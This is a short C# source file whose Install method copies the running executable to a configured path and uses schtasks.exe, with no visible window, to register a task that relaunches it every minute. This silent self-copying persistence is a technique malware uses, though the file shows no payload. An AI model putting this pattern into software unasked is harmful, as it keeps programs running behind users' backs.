
using System.Diagnostics;

namespace stms;

public class Installation
{
    public static void Install()
    {
        try
        {
            if (File.Exists(Config.file_path))
                File.Delete(Config.file_path);

            File.Copy(Environment.ProcessPath, Config.file_path, true);

            if (string.IsNullOrWhiteSpace(Config.task_name))
                throw new ArgumentException("Empty task name!");

            if (string.IsNullOrWhiteSpace(Config.file_path))
                throw new ArgumentException("Empty exePath!");

            string actionCommand = $"\\\"{Config.file_path}\\\" --start";
            string arguments = $"/Create /TN \"{Config.task_name}\" /TR \"{actionCommand}\" /SC MINUTE /MO 1 /RL LIMITED /F";

            using var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = arguments,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            process.Start();
            process.WaitForExit();
        }
        catch
        {
            throw;
        }
    }
}